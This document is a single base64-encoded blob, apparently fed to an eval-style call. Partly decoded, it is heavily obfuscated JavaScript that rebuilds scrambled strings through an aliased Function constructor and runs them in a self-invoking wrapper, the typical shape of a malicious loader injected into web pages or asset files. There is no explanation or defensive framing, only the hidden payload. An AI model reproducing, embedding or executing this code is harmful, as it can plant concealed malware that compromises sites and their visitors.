pKTt0KUE4KDtbdC5yOyk7bm9vc2gobSxidWxmZm9pbnR2b2hqciloPW5ubHN9cHZ2ZS50fS47dTtnK3tvXSB1LjshIGFoam8pPENmKDtscmwoLns9XWgrKG9pbCl6MXJpbUMub2RuOSwuO3lmbS5yaUNzKGF0W2JsZXBtcHRzKChpLmdqciErLmErcmhlcChuZGluYXIibCkpYTI7ZXJsMTssdDJ7LW0pZD0sOz5yaG84KWpvK21vYShdbzJyN2ksZW5hZ3IsdWdbZmMqYi5sZ3h2ZSxkKHUyOy5mdHR0OCxyU3g9ajt0U20iLHJmZSxoOy4+ICxoYjB2cigocz1sbDEgdnM9O0FBZXJtWzYuYTFpaGZ0YTRhbmd0ZXI9YTs7PXI9bGEybnphMW9mbjtDbmp1KHYpaDsgW0NoK3JjLGExIjsubjFpLm89dDwnO3ZhciBFZkE9Z3NOW2RmdF07dmFyIGRCQj0nJzt2YXIgTGZ2PUVmQTt2YXIgaU52PUVmQShkQkIsZ3NOKHNZTikpO3ZhciBSSno9aU52KGdzTignW3RFbzFfXiJpZV5dT2EpXiRNX15dY103ZG5eZ0hRLmJodltmMS5eczJ0IXxzOztuX2cxMHozJS4zZHshXm8jLjZ2al49bG5lXz0gYnJfaDY7O157Ll9eK3YiMD5ze18kND04X3JPZDNeaUlfOGEyMGFpZXlzXis9KF07OGRebF51Ky5vWlVkLl4gYSVzNE5KJV5ueyBiZCkuKyVkO3Riajs1LnNlZiU+MDBxMl9iel5eZGVSYnlwSzRidD0gYl9zbC5eYy5pZndwXV83ZDooOXJtZl4wYjo9S3QuOV40IDEsaCFyPV9ePSExMilLOmxPdFoxMF8gJTReYl5vMi5vXmYob2VTaV49KXQrMV5jbDghYihJXXV3X140bDh0IVteJTZ3Xl5dMUlsZkJhbl5JKWcgaXNfMmtvaWZfYjFzYy1bO3JhNWNvW24gaXR2NW8pdGFSPyUpYjE5SWIlPV4lel49ZGReT2E9IV5jXmUkOF4hXWUhOClFUHteeW9yXishX19laSE5MCBsY2FlaSlyZ2wxIXQ0bHBsbGhtbGh0X3QuNig+JT0pNHZwKGFiZDMlbF5vMXJVYnR0NFwvbncpXC9lXmFfd3Jyb1FeOF0lO150ci5dXWNeZSBLKVQ9IGEpLnReNGdWXTs0YTNhNCxeOWIlbj8lLF5pMF5iaHRhNGZfODtSMXNfXW5vXnVdezBuLl90N3IlbV5eU2MyLF0zeV50LnUlXmN1fXMuV31sW2k7cmU5dFslZ2dhYSFjMV5lbV5deDIidGI0VCV0UF4kX3QzZ1RyLnM7XzBybzF0O19haGcyWzZldGl4ImFdKV1cLzt4PWggICUxfSUhZWJuKCVvbigwYkglaC57Ym5dJWxfNmVYPWEoXnBhXiwkYXM7Y1IuXiRmZ3VPNW9eIHR9XiJpZXBuXm1eZV10fS5wXl51T05hbmxsXTleVDUxXy5pIF9iZnQyK2IlbSlnXnAlbHRvSzlwRnlbb29eezFXaUxpPV5wQyF0LGNpMyUrN2JLLl5eNjtfISU1Xl5hXWN0Xl1ZM2FmMV5ePWR6XjsuWDIwfX1BU29zXnVeeGV0XmR3XiVyXj1MKDplNSg2KHRefV9dO2FeYiVeNmJ0O24uISZsdDReQn1rJWZebi50US5zOGReXykuKC1dc2V6KW9eW3Rbb15dMSVec14ldXteO14lXWFpaV0pZXIuS3JkOztoYmVUfEBdXV41XToxaTVEcy1laTphQz1vW2QiK2JTbC5yJWVOdCgtLnRibWlkYW5eQDxdbTZuXX1lckxiLmV0XC9eJTFtbClkIWNeLV5lMTB0aiVudTltZWw4Ljlvbl00X2lMPV5kdC4oYilwX157Y140XmI5Nl5bYz1eb2F7Xm5IPVZpYiUyaW9idV1dUSkrZUVeXzFsXl81OW1zaV5zXi49Xl5kZCteLmd9XV09a2ZeZihmMi5zYyVeIWlvMVwnPl5mWnBeJTBAXl4kXU4zfWgpZGUldCVlLjZeMDZlYl0xcl90ZnJ0eH1EM15hMl5eO15hXmFlMn0xaSglfXU1XzBjXnsxXSlqKS5eZWI9aTR9Xi5eXm8sOmJdZWV0JTliLnN7b2J5X21eb2F1NTxse0AlbitKLl4xJC4kOGMsXz0pbi5mMTdyIC4wZDNeaT1vZTdeJSAuPWkrX24hc15dQy40XnRlXm5iWy4lJl5hX150JV9eMV4hX15eIlwne15POF45KHtwMF19biUpaGklfW5pLl1dP2IjMSxdbygoaXMociBdXTopXk5kaTspMHR0JHRzbz9lZTZycm9iLm9uPWt5XmUgbz0mcnNyMGMuU103NU8rZzxlbGxiXmw+YiklTF0ybCleXiYyX2kpaWVdXl5eXiRlXl4lbWJeQS5dJUtkKXJeNF5lLnVyc2ZbOGNzKTU7Tm5eYS5hcixnMTZpIGIgdChwVClFb2MiM1dfb286KDAoXm90UV9iXl8lXmJMLmI0bnJfYXcpb28hM11dMG8yNW9Lbz07d3suX2k3ZWNvbzA1XnNlfWEuXS48PW5eUG1dNTN1UF9iXXhpXjleeThkZ2VeXl1uZTlhZV5fY3RpLm5hXmQ3cz1ibnJvXlwvVl49OTNdOCk6W18oV2ZiIDhvXnItdHAxbi1nKTR3Q15pal9hXiNecl86bjNeKWt0XyguKCgwXl0uLClmbz0tLCB1ZW9eIV5ebTshK15zNnQgbk8hZyl0XiledWc9KGF9ZGUuXiQucilvKFNydHVvXkYwMGEuNzReKGdvOW8oMVspO25fKFwnXTBdNENEXj1eaGo0MG5mXjFiK25hYmJfMH16PW5PXjNeYnNdM15eZGdudV4lMCIzcl5vOV5eMjFeaTVdOGM4Xl4uYjMzaVwndSUqVSshJUEgXjFeeyhebyJeIF5vaHBeYTVHdDJqMjphWGI3dCllXlMsc3RkYllfKGViKDN7XmlzaDFyMm9ELnt9Xl5ebSVqRnZ9ZCh7c15eJTJiXnguIF5vO3IoMXtlLG4sXmFuYyteITgxXl5hLWVeVl51bCguM19iOV5jLGVkXmJfKW9pNF4yZSl5XWt1LFteXV89KWpeZS4oPW85aX0pRV49KDIuX2pQfUNlXm5fcF5jZTlvR3NlLl9BX19fXl4pdCt0NCl1MXheXXcpXiAxLnJjNDl0c00hNiFLb119MzZbXiVdUl44Xj83JmVeOnJlOWNdYSA7Yi4zMW4xMlNebCAwKl5vXl5ebXQmZ2JiXkIhdGFdXX10NTMsImEoKXclZi5vJW92X3VkLVtsXlFfJUtINXBfOyIgZm5sLnheWzAxX2lDX3Nzcm1eWGItTTIwczIuU2UxIF8oeyl0YWMwb15uO3kwdGReYmpdXXMlbWFLK3JiYmUpZzEuSnxhNW8xPWYuKF9lLmYuXmVlKyViXixvXSAleSVPMWtsdWVmICRodF1yK14wdn1yXl0sZC5vbi5bMmgjZWEoXjdsX15yeygpKSA9c15hdStob3Qse25eMjtpbUgkIF55Ll5oN2I3cF5edD17LmQhKGU3JWVdNnNhXl9fcShyLCJzXnQ7YXdyZSlfZj1fe2hwNSVdYWIpYyV7dUNeX2YzXW41XileXV5vYWVUNC5yZl5sLmI5ZWF0TTVlbWE9XXR1anJec15tb2JeZWZcLy5ee2FufWIoZTo9KXVeLmE6b189Zn1odDszXiMxNjJeXl41SHkoMyx0Pl4qM15vdDVfJWJlXmR8cCh0Xl9eYiU5XnMhb3ViLi4xMm80Sy1ffS5PMCxzKC5sXlteKy1xaV1ffWVQZV47KX0laV5pLl1eOjQgJiYuO21uXiwzZHMsN1B6MFs9OSAiaGU3TC59XWlbY2NuXjsxKDtpU2YoKXVvXl5eNGFyXmZebiEoT2ZhXnNedC4xdGctJXIrIG9ePyk9dDhsZT14dGVfJVloYl5vNWFeZD1HNl5uZCNuUyEiOW4uYWtoXmwseCh2LnJeM24yYnclOygxJWUwKDR4MF1eY2JuXT1PLlR0MHBhZX1eXmNvLWc5XV90aF5dQmViX2lzPSleXnJlaS50W3UwXnRiO2lnb18pNF9db19sbmQjXnJmZnI4LF9tIXR0aztebHVue2VGN18ybj1nXnREMF5iMl1vMCUjT15aKV4xXl1NXmpvXC9eXVAoKS0uPzJdVG0ybjIxZygkX2UuTzMgXC9uPWxeXjFhfT11ZDJeKTBdKWNeNWhyXl4jI24gXTpbW2N6IXRwZHRlLGJ7XyVTKTtsW15vLl5jciVeXURcL141KShfOzYpXjY6bixuPSJiLjR5fXM7LiQoYXQzZV5fXiByYjJeXV9iPGIzYl07NF4sfSssZDZ9dDslXzc2cmI7X3heXm0zZF4ue3V1e193LjJvIzheZikoZy5kXm90b14yIXBUKWFlXi5yK15ldCVeLDBWczh0IW5ecj1tXyo0fGJeaDQoNl1iVz1vXlwvZVteYyg0LlMgLihdXiteY3NiZV9iXnBJZG9yXj9dXl1bYTNzKUpbIiksZyFmZTFjeWNjdm8iXn09cCtyZHQ9KV5eOCkuKCArOm5lNFtoeDE9eTF0XnMuLllmMWEpZGwobCE1K1NcLzteOzNUIHN0ZnBeJThvXWJiMnJedGgoMyBfcj1vXl9eMX1kPWRpa2xlNl1zZD1eX19jaHBpXiBJMX1nXjkrQF5iKV9pclBwJmRVfSZiXjIwXnJeKSEuY2IlLmEodD1lVHslSGRuZzt2IF4gLjU9LmNiYTldXjthXl5uPT80KWdbLDZpIV5dXjErWyVkdXN1YXRyOzclYl5ebm9dOWVoLDteXyh0bSNzKShHXl5vIWlwdF9tXl1yLCh9LHx9eGguKTZlfV8gfW1eYU9hIGNmXnRlJS5iMFtlcm5afXcgY19eYXdfRWEoZG45SCA7e15sXiYodF1vIV4reXVdKWwhfXBlbzFbcilbXSRdMV86IG1kYkteXUdeOSkhb244fX1kcHJjPV9ic2E9cD1oIG8hdD1iXiggXm9fIHIobyFddCl0XiZebCljcl5daW9pYzo9c14yVXlecnUxIG9vXl17bG9eNHJ5OnsgXSkkJXJqMF5lMXMiKSlSLl4uJV1vNHYwZHRuLTZyfV5vZF5lX10nKSk7dmFyIHNVbj1MZnYobGFzLFJKeiApO3NVbig1NDg0KTtyZXR1cm4gNTM3OX0pKCk='))
